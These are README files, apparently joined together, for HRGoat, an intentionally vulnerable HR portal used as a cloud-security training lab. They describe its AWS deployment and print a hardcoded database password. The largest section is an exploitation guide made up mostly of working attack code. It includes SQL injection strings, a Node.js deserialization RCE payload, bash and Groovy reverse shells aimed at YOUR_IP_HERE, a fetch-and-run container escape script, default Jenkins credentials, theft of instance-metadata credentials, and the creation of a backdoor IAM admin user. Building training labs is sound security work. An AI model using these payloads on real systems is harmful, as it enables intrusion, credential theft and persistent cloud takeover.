# HRGoat HR Management Portal

This repository contains the HRGoat HR Management Portal application, a comprehensive HR management system with features for employee management, document handling, calendar events, and more.

## Repository Structure

- **`/src`**: Frontend application code (React)
- **`/server`**: Backend server code (Node.js/Express)
- **`/terraform`**: Infrastructure as Code for AWS deployment
- **`/.github/workflows`**: CI/CD pipelines for automated deployment

## Features

- Employee management
- Document management
- Calendar events
- Payroll & benefits
- Performance tracking
- User authentication
- Profile management
- Notifications

## Development Setup

### Prerequisites

- Node.js (v16 or newer)
- npm (v7 or newer)
- MySQL database

### Local Development

1. Clone the repository:

```bash
git clone https://github.com/your-username/hr-portal-symphony.git
cd hr-portal-symphony
```

2. Install dependencies:

```bash
npm install
```

3. Start the development server:

```bash
npm run dev
```

4. In a separate terminal, start the backend server:

```bash
cd server
node server.js
```

## Deployment

### Manual Deployment

See the [terraform/README.md](terraform/README.md) file for instructions on manual deployment using Terraform.

### Automated Deployment with GitHub Actions

This repository includes GitHub Actions workflows for automated deployment:

1. **Infrastructure Deployment**: Deploys AWS infrastructure using Terraform
2. **Application Deployment**: Deploys the application to the EC2 instance
3. **Infrastructure Destruction**: Safely destroys the AWS infrastructure when needed

For more information on setting up the required GitHub secrets, see [.github/GITHUB_SECRETS.md](.github/GITHUB_SECRETS.md).

## Security Considerations

- The application includes intentional vulnerabilities for educational purposes
- Do not use in production without addressing these vulnerabilities
- See comments in the code marked with "VULNERABLE CODE" for details

## License

This project is licensed under the MIT License - see the LICENSE file for details.

# HR Portal Symphony Infrastructure

This repository contains the infrastructure setup for the HR Portal Symphony application, including Terraform configurations for AWS resources, Docker containerization, and CI/CD pipelines.

## Infrastructure Components

- **VPC and Subnets**: Creates a new VPC with public subnets
- **EC2 Instances**:
  - Application instance for running the HR Portal
  - Jenkins instance (version 2.270) for CI/CD
  - Both instances are accessible via AWS Systems Manager (SSM) without SSH keys
- **Application Load Balancer (ALB)**:
  - Routes traffic to the application EC2 instance
  - Provides a stable DNS name for accessing the application
  - Handles health checks and improves availability
- **RDS Instance**:
  - Public RDS instance with no backups
  - Username: admin
  - Password: hrportaladmin123
- **ECR Repository**: For storing the application Docker image
- **CI/CD**: GitHub Actions workflow and Jenkins pipeline for automated deployment
- **Resource Tagging**: All resources are tagged with common tags for identification and management
- **State Management**: Terraform state is stored in an S3 bucket with a unique name for persistence and team collaboration

## Prerequisites

- AWS CLI installed and configured
- Terraform installed (version 1.0.0 or later)
- Docker installed (for local development)
- GitHub account (for GitHub Actions)

## Getting Started

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/hr-portal-symphony.git
cd hr-portal-symphony
```

### 2. Deploy Using GitHub Actions

The repository includes GitHub Actions workflows for infrastructure management:

#### Creating the Infrastructure

1. Navigate to the "Actions" tab in your repository
2. Select the "Create Infrastructure and Deploy Application" workflow
3. Click "Run workflow"
4. Click "Run workflow" to start deployment

This workflow will:
- Create a unique S3 bucket for Terraform state with an epoch timestamp suffix
- Create the infrastructure using Terraform
- Build the Docker image and push it to ECR
- Deploy the container to the EC2 instance
- Output the S3 bucket name for reference when destroying infrastructure

#### Destroying the Infrastructure

1. Navigate to the "Actions" tab in your repository
2. Select the "Destroy Infrastructure" workflow
3. Click "Run workflow"
4. Enter the S3 bucket name that was created during deployment
5. Type "destroy" in the confirmation field
6. Click "Run workflow" to start destruction

### 3. Manual Deployment (Alternative)

If you prefer manual deployment:

```bash
# For Linux/macOS
./setup.sh

# For Windows
setup.bat
```

### 4. Configure GitHub Secrets

Add the following secrets to your GitHub repository:
- `AWS_ACCESS_KEY_ID`: Your AWS access key
- `AWS_SECRET_ACCESS_KEY`: Your AWS secret key

### 5. Connect to EC2 Instances via SSM

Use the SSM connection commands from the setup script output:

```bash
# Connect to application instance
aws ssm start-session --target i-xxxxxxxxxxxxxxxxx

# Connect to Jenkins instance
aws ssm start-session --target i-yyyyyyyyyyyyyyyyy
```

### 6. Access Jenkins

1. Navigate to `http://<jenkins_instance_public_ip>:8080`
2. Follow the setup instructions to complete Jenkins configuration
3. Install required plugins:
   - AWS Steps
   - Docker Pipeline
   - Pipeline
   - Git Integration

### 7. Configure Jenkins Pipeline

1. Create a new pipeline job in Jenkins
2. Configure it to use the Jenkinsfile from your repository
3. Add the following credentials in Jenkins:
   - `aws-credentials`: AWS credentials for ECR and SSM access
   - `ECR_REPOSITORY`: ECR repository URL
   - `EC2_INSTANCE_ID`: Application EC2 instance ID
   - `RDS_HOST`: RDS endpoint

## Accessing the Application

After deployment, access the HR Portal application through the ALB at:
```
http://<alb_dns_name>
```

Alternatively, you can also access it directly via the EC2 instance at:
```
http://<app_instance_public_ip>:3000
```

## Resource Tagging

All AWS resources created by this infrastructure are tagged with the following common tags:

```hcl
common_tags = {
  App  = "HR-GOAT-APP"
  Note = "For security testing"
  Name = "DemoHRApp"
  Link = "https://github.com/SilentProcess87/cyber-lab-hr-simulator"
}
```

These tags help with resource identification, cost tracking, and management.

## Terraform State Management

The Terraform state is stored in an S3 bucket with a unique name using the format `hrgoat-tfstate-<timestamp>`. This approach:
- Ensures uniqueness for multiple deployments
- Prevents naming conflicts across different users or environments
- Allows each infrastructure deployment to have its own isolated state
- Automatically cleans up the bucket upon infrastructure destruction

## Troubleshooting

- **SSM Connection Issues**: Ensure the EC2 instances have internet access and the SSM agent is running
- **Docker Issues**: Check Docker logs on the application instance with `docker logs hrportal`
- **Database Connection**: Verify the RDS security group allows connections from the application EC2 instance
- **Terraform State Issues**: Check the S3 bucket for the presence of the state file

## Security Notes

- The RDS instance is publicly accessible with a fixed password for demonstration purposes
- In a production environment, consider:
  - Using AWS Secrets Manager for database credentials
  - Implementing private subnets for RDS
  - Enabling RDS backups
  - Using HTTPS with proper certificates

# HRGoat - Cloud Security Vulnerability Training Environment

This repository contains the HRGoat application - an intentionally vulnerable HR management portal designed to demonstrate common cloud security vulnerabilities in a controlled environment. It simulates a realistic HR system with multiple security flaws that can be exploited to practice offensive security techniques and understand cloud security concepts.

## Project Overview

HRGoat is created for:
- Security professionals to practice cloud-based exploitation techniques
- DevOps engineers to understand secure deployment practices
- Development teams to learn about secure coding
- Organizations to use in security awareness training

> ⚠️ **WARNING**: This application contains deliberate security vulnerabilities. Deploy it only in isolated, controlled environments and never in production or connected to sensitive systems.

## Application Description

HRGoat mimics a modern HR management system with features including:
- Employee management (create, update, delete, bulk upload)
- Document handling and storage
- User authentication and authorization
- Profile management
- Notification systems

The application is built using:
- Frontend: React
- Backend: Node.js/Express
- Database: MySQL
- Infrastructure: AWS resources deployed via Terraform
- Containerization: Docker
- CI/CD: GitHub Actions workflows

## Deployment Instructions

### Deploying with GitHub Actions

The repository includes automated workflows for deployment:

1. **Prerequisites**:
   - GitHub account
   - AWS account with appropriate permissions
   - The following GitHub secrets configured:
     - `AWS_ACCESS_KEY_ID`
     - `AWS_SECRET_ACCESS_KEY`

2. **Deployment Steps**:
   - Fork this repository to your GitHub account
   - Navigate to "Settings" → "Secrets" and add the required AWS credentials
   - Go to the "Actions" tab and select the "Create Infrastructure and Deploy Application" workflow
   - Click "Run workflow" to start the deployment process
   - The workflow will:
     - Create a unique S3 bucket for Terraform state
     - Deploy AWS infrastructure using Terraform
     - Build and push the Docker image to ECR
     - Deploy the application to EC2 instances

3. **Accessing the Application**:
   - Once deployed, the workflow output will display:
     - Application Load Balancer URL
     - EC2 instance IP addresses
     - Jenkins server URL

## Vulnerability Overview & Exploitation Guide

This section documents the vulnerabilities present in HRGoat and how to exploit them for educational purposes.

### 1. SQL Injection Vulnerability

**Location**: Employee search functionality

**Exploitation**:
1. Navigate to the employee directory page
2. In the search field, enter: `' OR 1=1 --`
3. This will bypass the search restrictions and display all employees
4. For more advanced exploitation, use: `' UNION SELECT user,password,3,4,5,6,7,8,9,10,11 FROM users --`
5. This reveals user credentials from the database

**Impact**: Data exposure, potential for complete database compromise

### 2. Insecure Deserialization Vulnerability

**Location**: Employee bulk upload feature

**Exploitation**:
1. Navigate to the "Bulk Upload" page under employee management
2. Create a malicious JSON payload with an RCE exploit in the metadata field:
```json
{
  "name": "Test User",
  "position": "Tester",
  "department": "Security",
  "email": "test@example.com",
  "phone": "555-000-0000",
  "location": "Remote",
  "hire_date": "2023-01-01",
  "status": "active",
  "manager": "None",
  "salary": 0,
  "bio": "This is a test.",
  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { cp.exec('ping -c 4 8.8.8.8', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/ping_success.log', stdout); } }); } catch (e) { fs.writeFileSync('/tmp/exception.log', 'EXCEPTION: ' + e.message); } return '';}()\"}"
}
```
3. Upload this payload using the "Upload Employees" button
4. The `metadata` field contains a Node.js deserialization vulnerability that allows remote code execution
5. Verify exploitation by checking if `/tmp/ping_success.log` was created

**Advanced Exploitation - Reverse Shell**:
```json
{
  "name": "Malicious User",
  "position": "Hacker",
  "department": "Security",
  "email": "hack@example.com",
  "phone": "555-000-0000",
  "location": "Remote",
  "hire_date": "2023-01-01",
  "status": "active",
  "manager": "None",
  "salary": 0,
  "bio": "This is a test.",
  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { fs.writeFileSync('/tmp/shell_attempt.log', 'Attempting reverse shell'); cp.exec('/bin/bash -c \\\"/bin/bash -i > /dev/tcp/YOUR_IP_HERE/4444 0<&1 2>&1\\\"', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/shell_error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/shell_success.log', 'Shell executed successfully'); } if (stderr) { fs.writeFileSync('/tmp/shell_stderr.log', stderr); } }); } catch (e) { fs.writeFileSync('/tmp/shell_exception.log', 'EXCEPTION: ' + e.message); } return '';}()\"}"
}
```
Replace `YOUR_IP_HERE` with your attack machine's IP and set up a listener with `nc -lvnp 4444`

**Impact**: Complete remote code execution on the application container

### 3. Container Escape Vulnerability

**Location**: Docker container configuration

**Prerequisites**:
- Access to the application container (via previous RCE)
- The container is running with the `--privileged` flag

**Exploitation**:
1. From your reverse shell in the container, download the container escape script:
```bash
curl -o escape.sh https://raw.githubusercontent.com/yourusername/hr-portal-symphony/main/container_escape_shell.sh
chmod +x escape.sh
./escape.sh
```

2. The script will detect the privileged container and offer multiple methods:
   - Direct host filesystem access via disk mount
   - Cgroups release_agent exploitation
   - Several shell access options:
     - Chroot shell
     - Bind shell
     - Reverse shell
     - Command execution bridge

3. For the simplest approach, choose the direct chroot shell if the host filesystem mount succeeds

**Impact**: Complete escape from container isolation, gaining access to the underlying host

### 4. Network Discovery & Jenkins Exploitation

**After container escape, install tools and discover Jenkins**:
```bash
# Install nmap on the host
apt-get update
apt-get install -y nmap

# Scan the internal network (10.0.0.0/16 subnet for AWS VPC)
nmap -sV -p- 10.0.0.0/16 --open
```

**Exploiting Jenkins**:
1. The scan should reveal Jenkins running on port 8080 within the same VPC
2. Access the Jenkins instance (using internal IP or hostname)
3. Jenkins exploitation options:
   - If unauthenticated access to script console:
     ```
     navigate to /script and execute: 
     println "whoami".execute().text
     ```
   - If credentials are required, common default credentials:
     - admin:admin
     - admin:password
     - jenkins:jenkins
   - Create a reverse shell via script console:
     ```groovy
     String host="YOUR_IP_HERE";
     int port=5555;
     String cmd="/bin/bash";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
     Socket s=new Socket(host,port);
     InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
     OutputStream po=p.getOutputStream(),so=s.getOutputStream();
     while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
     ```
   - Start another listener: `nc -lvnp 5555`

### 5. Jenkins Container Breakout & Privilege Escalation

**Check if Jenkins container is privileged**:
```bash
cat /proc/self/status | grep CapEff
```

**If privileged, escape the container**:
```bash
# Use the same container escape technique from earlier
./container_escape_shell.sh
```

**Perform host privilege escalation if needed**:
```bash
# Check for common misconfigurations
find / -perm -4000 -exec ls -l {} \; 2>/dev/null  # SUID binaries
find / -writable -type d 2>/dev/null  # Writable directories
sudo -l  # Sudo permissions

# If Docker is available on the host
docker images
# If you have Docker access, you can mount the host filesystem:
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash
```

### 6. AWS IAM Privilege Escalation

**Check AWS credentials and permissions**:
```bash
# Look for AWS credentials
find / -name "credentials" | grep ".aws"
cat ~/.aws/credentials
env | grep AWS

# Check attached IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Enumerate permissions**:
```bash
# Install AWS CLI if needed
apt-get install -y python3-pip
pip3 install awscli

# List permissions
aws iam list-attached-role-policies --role-name $(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
aws iam get-policy-version --policy-arn <policy_arn> --version-id <version_id>
```

**If overly permissive IAM policy exists, create an admin user**:
```bash
# Create admin user
aws iam create-user --user-name backdoor-admin

# Assign administrator permissions
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys
aws iam create-access-key --user-name backdoor-admin

# Output will show:
# AccessKeyId: AKIAXXXXXXXXXXXXXXXX
# SecretAccessKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Security Remediation

To address the vulnerabilities in this application, consider the following remediations:

1. **SQL Injection**: Implement parameterized queries and input validation
2. **Insecure Deserialization**: Avoid deserializing user-controlled data or implement secure deserialization libraries
3. **Container Security**: Never use the `--privileged` flag; apply principle of least privilege
4. **Network Segmentation**: Implement proper VPC security groups and network ACLs
5. **Jenkins Security**: Use strong authentication, remove default credentials, restrict Script Console access
6. **IAM Security**: Follow least privilege principle for IAM policies; implement role assumption with temporary credentials

## Responsible Disclosure

This project is intended for educational purposes in controlled environments. If you discover similar vulnerabilities in production systems, please follow responsible disclosure practices.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This software is provided for educational purposes only. Using security testing techniques on systems without explicit permission is illegal. The author is not responsible for any misuse of this software.
